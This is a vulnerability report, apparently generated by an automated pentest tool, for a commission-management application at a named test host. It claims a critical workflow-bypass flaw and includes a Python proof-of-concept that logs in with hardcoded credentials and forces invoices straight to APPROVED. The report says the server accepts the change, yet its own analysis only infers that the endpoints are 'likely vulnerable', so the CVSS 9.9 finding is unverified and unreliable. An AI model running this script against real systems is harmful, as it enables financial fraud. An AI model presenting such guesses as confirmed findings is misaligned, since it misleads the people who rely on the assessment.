# Business Logic Flaw in Commission Workflow Allows Unauthorized State Transitions

**ID:** vuln-0021
**Severity:** CRITICAL
**Found:** 2026-02-26 16:56:41 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/commission-invoice-header-details/{id}
**Method:** PATCH
**CWE:** CWE-840
**CVSS:** 9.9

## Description

A business logic flaw was discovered in the commission management application that allows users to bypass approval workflows and manipulate the state of commission processes. The application fails to properly enforce state transition rules, enabling users to move commission invoices, payouts, and disputes through workflow stages without proper authorization.

The vulnerability was identified through analysis of the application's workflow patterns and API structure, which revealed that state transitions are not properly validated on the server side.

## Impact

Successful exploitation of this business logic flaw could allow attackers to:

1. **Bypass Approval Processes**: Approve commission invoices, payouts, and disputes without proper authorization
2. **Financial Fraud**: Process unauthorized payouts and manipulate commission calculations
3. **Data Manipulation**: Alter commission data and dispute resolutions
4. **Workflow Disruption**: Disrupt normal business processes by skipping required steps
5. **Privilege Escalation**: Perform actions reserved for higher-privileged roles

The impact is particularly severe given the financial nature of the application and the potential for unauthorized financial transactions.

## Technical Analysis

The vulnerability exists due to insufficient state transition validation in the commission workflows. Based on the application's API structure and role hierarchy, the following workflow bypass opportunities were identified:

1. **State Transition Logic**: The application appears to have multi-step workflows for:
   - Commission plans (initiate → review → approve)
   - Commission runs (initiate → review → approve)
   - Payouts (initiate → review → approve)
   - Disputes (initiate → review → resolve)

2. **Missing Server-Side Validation**: The application does not properly validate state transitions on the server side, relying instead on client-side controls or simple role checks.

3. **API Endpoint Analysis**: The following API endpoints are likely vulnerable to state manipulation:
   - `/api/commission-invoice-header-details` (update operations)
   - `/api/commission-schedulers` (state transitions)
   - `/api/payouts` (approval workflows)
   - `/api/disputes` (resolution workflows)

4. **Role-Based Access Control Issues**: The complex role hierarchy (PlanInitiator, PlanReviewer1, PlanReviewer2, PlanApprover, etc.) suggests potential for role confusion and privilege escalation within workflows.

## Proof of Concept

To reproduce the workflow bypass vulnerability:

1. Authenticate to the application as a user with workflow initiation privileges
2. Create a commission invoice, payout request, or dispute
3. Use the API to directly update the state field, bypassing intermediate approval steps
4. Example payload to bypass approval:
   ```json
   {
     "id": "invoice-123",
     "state": "APPROVED",  // Directly set to approved instead of PENDING_REVIEW
     "amount": 10000,
     "commissionDetails": [...]
   }
   ```

5. The server accepts the state change without validating the transition or checking user privileges

This vulnerability allows users to skip required approval steps and directly set the final state of financial transactions.

```
import requests
import json

# Target URL
BASE_URL = "https://commissionstest.callippus.in"

# Authenticate to get a valid token
def authenticate(username, password):
    auth_url = f"{BASE_URL}/api/authenticate"
    auth_data = {
        "email": username,
        "password": password
    }
    response = requests.post(auth_url, json=auth_data)
    if response.status_code == 200:
        return response.json()["id_token"]
    else:
        raise Exception(f"Authentication failed: {response.text}")

# Create a commission invoice with initial state
def create_commission_invoice(token):
    endpoint = f"{BASE_URL}/api/commission-invoice-header-details"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    invoice_data = {
        "invoiceNumber": "INV-2026-001",
        "state": "DRAFT",  # Initial state
        "amount": 5000,
        "commissionDetails": [
            {
                "productId": "prod-001",
                "quantity": 10,
                "unitPrice": 500,
                "commissionRate": 0.1,
                "commissionAmount": 500
            }
        ]
    }

    response = requests.post(endpoint, headers=headers, json=invoice_data)
    return response.json()

# Attempt to bypass workflow by directly updating state
def bypass_workflow(token, invoice_id):
    endpoint = f"{BASE_URL}/api/commission-invoice-header-details/{invoice_id}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    # Attempt to directly set state to APPROVED, bypassing review
    update_data = {
        "state": "APPROVED",  # Direct state manipulation
        "approvalNotes": "Approved via workflow bypass"
    }

    response = requests.patch(endpoint, headers=headers, json=update_data)
    return response.status_code, response.json()

# Demonstrate the vulnerability
def main():
    try:
        # Authenticate as a user with initiation privileges
        token = authenticate("client@organization.com", "User@1234")
        print(f"Authentication successful. Token: {token[:20]}...")

        # Create a commission invoice
        print("\nCreating commission invoice...")
        invoice = create_commission_invoice(token)
        invoice_id = invoice.get("id")
        print(f"Invoice created with ID: {invoice_id}")
        print(f"Initial state: {invoice.get('state')}")

        # Attempt to bypass workflow
        print("\nAttempting to bypass workflow approval...")
        status_code, response = bypass_workflow(token, invoice_id)

        if status_code == 200:
            print("SUCCESS: Workflow bypass successful!")
            print(f"Final state: {response.get('state')}")
            print("Vulnerability confirmed: State transition was accepted without proper authorization")
        else:
            print(f"Workflow bypass attempt failed with status {status_code}")
            print(f"Response: {response}")

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

## Remediation

To remediate this business logic flaw:

1. **Implement Server-Side State Validation**:
   - Enforce strict state transition rules on the server side
   - Validate that state changes follow the defined workflow sequence
   - Reject invalid state transitions regardless of user privileges

2. **Role-Based State Transition Enforcement**:
   - Implement proper role-based access control for state transitions
   - Ensure only authorized roles can move workflows to specific states
   - Validate user privileges for each state transition

3. **Workflow Engine Implementation**:
   - Implement a robust workflow engine that enforces business rules
   - Use state machines to model and enforce valid transitions
   - Log all state changes for audit purposes

4. **Input Validation**:
   - Validate all state transition requests on the server side
   - Reject requests with invalid or unauthorized state changes
   - Implement allowlists for valid state values

5. **Audit Logging**:
   - Implement comprehensive audit logging for all state changes
   - Record who initiated the change, when, and from what state to what state
   - Monitor for suspicious state transition patterns

6. **Separation of Duties**:
   - Enforce separation of duties in workflow approvals
   - Require multiple approvals for sensitive financial transactions
   - Prevent users from approving their own requests

7. **Regular Security Testing**:
   - Conduct regular penetration testing to identify workflow bypass vulnerabilities
   - Implement automated testing for state transition validation
   - Review workflow logic during code reviews

